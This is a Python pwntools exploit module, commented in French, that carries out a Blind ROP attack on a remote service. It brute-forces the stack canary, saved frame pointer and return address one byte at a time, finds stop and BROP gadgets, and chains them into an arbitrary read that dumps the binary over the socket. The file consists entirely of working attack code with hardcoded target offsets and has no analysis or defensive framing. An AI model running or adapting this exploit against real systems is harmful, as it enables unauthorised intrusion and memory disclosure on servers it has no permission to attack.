#!/usr/bin/python3

from pwn import *
import sys
import main

# SYNTAX COLOURS AND SYSTEM DATA:

CRED = '\x1b[1;31;1m'
CVER = '\x1b[1;32;1m'
CJAU = '\x1b[1;33;1m'
CPUR = '\x1b[1;35;1m'
CEND = '\x1b[0m'

DODO	= 0.06


##### Leaking values #####--------------------------------------------------------------------------

def leakValues(ExploitStructure):

	TMP			= ExploitStructure
	LEAKEDINFO	= []

	tabstr	= ['CANARY     ', 'RBP        ', 'RETADR     ']
	indice	= 0

	while len(LEAKEDINFO) < 3:

		PAYLTMP	= TMP.BUFFER
		for VALUE in LEAKEDINFO:
			PAYLTMP += VALUE

		LEAKVAL = b''
		OA = 0

		# En cas de presence de \x0A dans la valeur leakee
		#LEAKVAL = b'\x0a\xf2\x45'
		#LEAKVAL = LEAKVAL[::-1]
		##################################################

		while len(LEAKVAL) < 8:

			for i in range(256):		# 256 hein

				r = TMP.remoteConnect()

				JUNK		= r.recv()		# "Enter"

				CHAR		= bytes([i])
				PAYLOAD 	= PAYLTMP + LEAKVAL + CHAR


				if OA == 3:						# Il arrive parfois que l'un des chars soit un 0xA
					LEAKVAL += bytes([0xA])		# Si jamais c'est le cas, apres 5 tentatives et 5 rejets
					r.close()					# le script attribuera 0xA a l'octet en cours de leak
					OA = 0
					break

				if i == 10:		# 10 == 0xA --> soit un saut de ligne, et ici ca fait planter le leak car
					r.close()	# le service stoppe la lecture et retourne donc un Bye! vu qu'il n'y a
					continue	# pas de segfault
					 

				r.send(PAYLOAD)
				sleep(DODO)

				RESP	= r.recv()
				NUM		= len(LEAKEDINFO) + 1

				print(CPUR + '[-] Leaked value (#{}) : 0x'.format(NUM) + CHAR.hex() + (LEAKVAL[::-1].hex()) + CEND, end='\r')

				### Propre au binaire attaque (a optimiser)
				'''
				if NUM == 2 or NUM == 3 and len(LEAKVAL) == 5:
					BEGIN	= b'\x00\x00\x7f' 
					LEAKVAL	+= BEGIN[::-1]
					break
				'''
				#############################

				if b'Bye' in RESP:
					LEAKVAL	+= CHAR
					r.close()
					break

				##### Court-circuitage du leak en cas de besoin #####
				#if NUM == 1:
				#	LEAKVAL  = TMP.CANARY
				#	r.close()
				#	break
				#elif NUM == 2:
				#	LEAKVAL = TMP.RBP
				#	r.close()
				#	break

				#LEAKVAL = b'AAAAAAAA' # a dégager pour exploit ^

				#####################################################


				try:
					r.close()
				except:
					pass


				if(i==255):
					print(CJAU + "[-] i raised to 255..." + CEND)
					OA += 1
					break

		main.persoPrint(tabstr[indice], LEAKVAL, 0)
		LEAKEDINFO.append(LEAKVAL)

		if len(LEAKEDINFO)		== 1:
			TMP.CANARY = LEAKVAL
		elif len(LEAKEDINFO)	== 2:
			TMP.RBP = LEAKVAL
		if len(LEAKEDINFO)		== 3:
			TMP.RETADR = LEAKVAL

		indice += 1
		
	return(TMP)

##########################--------------------------------------------------------------------------

##### STOP GADGET #####-----------------------------------------------------------------------------

def getStopGadget(ExploitStructure):		# Recuperation d'un Stop Gadget et de l'adresse de base du binaire

	TMP		= ExploitStructure
	TMPBASE	= 0xFFFFFFFFFFFFF000 & u64(TMP.RETADR)	# Il ne s'agit pas forcement de la vrai base du binaire
													# mais ça fait le taff pour calculer les offsets
	STOPOFFSET = 0x221
	return p64(TMPBASE + STOPOFFSET)

	# v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DU STOPGADGET DETERMINE  v v v v v

	BEGIN	= TMP.beginning()
	START	= TMPBASE

	for i in range(START,START+0x1000):	# A MODIFIER A LA MAIN EVENTUELLEMENT

		r = TMP.remoteConnect()

		JUNK		= r.recv()		# "Enter your choice"

		PAYLOAD 	= BEGIN + p64(i)

		print(CPUR + "[-] Tested Stop Gadget address : " + hex(i) + CEND, end='\r')

		r.send(PAYLOAD)
		sleep(DODO)

		RESP	= r.recv()

		if b'Enter' in RESP:
			print(CVER + "[+] Potential Stop Gadget located at : " + hex(i) + CEND)
			OFFSET	= i - TMPBASE
			print(CVER + "[+] Offset from Pseudo Base could be : " + hex(OFFSET) + CEND)
			print(CJAU + "[!] --> Update getStopGadget() function !" + CEND)
			r.close()
			return p64(i)
		sleep(DODO)

		try:
			r.close()
		except:
			pass

#######################-----------------------------------------------------------------------------

##### BROP gadget #####----------------------------------------------------------------------------- 

def getBropGadget(ExploitStructure):

	TMP		= ExploitStructure
	TMPBASE	= 0xFFFFFFFFFFFFF000 & u64(TMP.RETADR)	# Il ne s'agit pas forcement de la vrai base du binaire
													# mais ça fait le taff pour calculer les offsets
	BROPOFFSET = 0x69A
	return p64(TMPBASE + BROPOFFSET)

	# v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DU STOPGADGET DETERMINE  v v v v v

	BEGIN		= TMP.beginning()
	START		= TMPBASE
	TRAPGADGET	= TMP.CRASH

	for i in range(START, START+0x2000):

		r = TMP.remoteConnect()

		JUNK		= r.recv()		# "Enter your choice"

		PAYLOAD 	= BEGIN + p64(i) + TRAPGADGET*6 + TMP.STOPGADGET + TRAPGADGET*6

		print(CPUR + '[-] Tested BROP Gadget address : ' + hex(i) + CEND, end='\r')

		r.send(PAYLOAD)
		sleep(DODO)

		#--------------------
		RESP	= r.recv()
		if b'Enter' in RESP:
			print(CJAU + "[+] Potential BROP Gadget located at : " + hex(i) + CEND)

			r.close()

			r = TMP.remoteConnect()
			JUNK	= r.recv()

			PAYLOAD	= BEGIN + p64(i+7) + TRAPGADGET*2 + TMP.STOPGADGET

			r.send(PAYLOAD)
			sleep(DODO)
			
			RESP = r.recv()
			if b'Enter' in RESP:
				print(CVER + "[+] BROP Gadget located at : " + hex(i) + CEND)

				OFFSET		= i - TMPBASE
				print(CVER + "[+] Offset from Pseudo Base could be : " + hex(OFFSET) + CEND)
				print(CJAU + "[!] --> Update getStopGadget() function !" + CEND)
				return(p64(i))

			sleep(0.03)
		#--------------------

		try:
			r.close()
		except:
			pass

#####



#######################-----------------------------------------------------------------------------

##### Fonction d'Arbitrary Read #####---------------------------------------------------------------

def getLeakFunction(ExploitStructure):	# Recupere une fonction de leak, donc permetant un arbitrary read ; en gros, permet de leak le binaire

	TMP = ExploitStructure

	BINBASE		= 0xFFFFFFFFFFFFF000 & u64(TMP.RETADR) - 0x1000
	LEAKOFFSET	= 0x1000
	return p64(BINBASE + LEAKOFFSET), p64(BINBASE)

	# v v v v v  PARTIE INUTILE UNE FOIS L'OFFSET DE LA LEAKADR DETERMINE  v v v v v

	BEGIN	= TMP.beginning()

	BROP7	= p64(u64(TMP.BROPGADGET) + 0x7)
	BROP9	= p64(u64(TMP.BROPGADGET) + 0x9)
	R15		= b'JUNKJUNK'

	BINBASE	= 0xFFFFFFFFFFFFF000 & u64(TMP.RETADR) - 0x1000	# Deja decrementee pour gagner du temps ^^
			# 		# RSI

	LEN		= 0x10	# RDX
	SOCKET	= 0x4	# RDI
	
	while True:

		for i in range(BINBASE+0x200, BINBASE+0x2000):		# A MODIFIER A LA MAIN EVENTUELLEMENT

			r = TMP.remoteConnect()

			#JUNK		= r.recv()		# "Enter your choice"
			
			ROPCHAIN	= BROP7 + p64(BINBASE) + R15 + BROP9 + p64(SOCKET) + p64(i)
			PAYLOAD 	= BEGIN + ROPCHAIN
			# ATTENTION : RDX n'est pas peuplé, et le BROP9 fonctionne mal - parait-il -

			print(CPUR + '[-] Tested Leaking address : ' + hex(i) + CEND, end='\r')

			r.send(PAYLOAD)
			sleep(DODO)

			#--------------------
			RESP	= r.recv()

			if b'ELF' in RESP:
				OFFSET	= i - BINBASE
				print(CVER + "[+] Leaking function found, offset from Base Address could be : " + hex(OFFSET) + CEND)
				print(CJAU + "[!] --> Update getLeakAdr() function !" + CEND)
				r.close()
				return p64(i), p64(BINBASE)

			try:
				r.close()
			except:
				pass
		
		BINBASE -= 0x1000		# Si pas de resultat, alors on decremente la BINBASE calculee

#####################################---------------------------------------------------------------

##### Test des gadgets #####------------------------------------------------------------------------

def testGadget(ExploitStructure, GADGET):

	TMP		= ExploitStructure
	BEGIN	= TMP.beginning()

	r	 = TMP.remoteConnect()
	JUNK = r.recv()

	#---------------------------------------------------------------------------
	if GADGET	== 'STOPGADGET':
		PAYLOAD		= BEGIN + TMP.STOPGADGET

	elif GADGET	== 'BROPGADGET':
		TRAPGADGET	= TMP.CRASH
		PAYLOAD		= BEGIN + TMP.BROPGADGET + TRAPGADGET*6 + TMP.STOPGADGET + TRAPGADGET*6

	elif GADGET == 'LEAKADR':
		TARGETADR	= TMP.BINBASE
		BROP7		= p64(u64(TMP.BROPGADGET) + 0x7)
		BROP9		= p64(u64(TMP.BROPGADGET) + 0x9)
		R15			= b'JUNKJUNK'

		LEN		= 0x10	# RDX
		SOCKET	= 0x4	# RDI
		
		ROPCHAIN	= BROP7 + TARGETADR + R15 + BROP9 + p64(SOCKET) + TMP.LEAKADR
		PAYLOAD 	= BEGIN + ROPCHAIN
	#---------------------------------------------------------------------------

	r.send(PAYLOAD)
	sleep(DODO)
	RESP	= r.recv()

	#---------------------------------------------------------------------------
	if b'Enter' in RESP and GADGET == 'BROPGADGET':

		r.close()
		BROP7		= p64(u64(TMP.BROPGADGET) + 0x7)

		r		= TMP.remoteConnect()
		JUNK	= r.recv()

		PAYLOAD		= BEGIN + BROP7 + TRAPGADGET*2 + TMP.STOPGADGET

		r.send(PAYLOAD)
		sleep(DODO)
			
		RESP = r.recv()
		if b'Enter' in RESP:
			print(CVER + " ---> is OK" + CEND)
			r.close()
			return
		else:
			print(CRED + " ---> [!] is wrong (second test fail)" + CEND)
			r.close()
			return


	elif b'Enter' in RESP and GADGET == 'STOPGADGET':
		print(CVER + " ---> is OK" + CEND)
		r.close()
		return

	elif b'Enter' not in RESP and GADGET == 'BROPGADGET':
		print(CRED + " ---> [!] is wrong (first test fail)" + CEND)
		r.close()
		return

	elif b'ELF' in RESP:
		print(CVER + " ---> is OK" + CEND)
		r.close()
		return

	else:
		print(CRED + " ---> [!] is wrong" + CEND)
		r.close()
		return


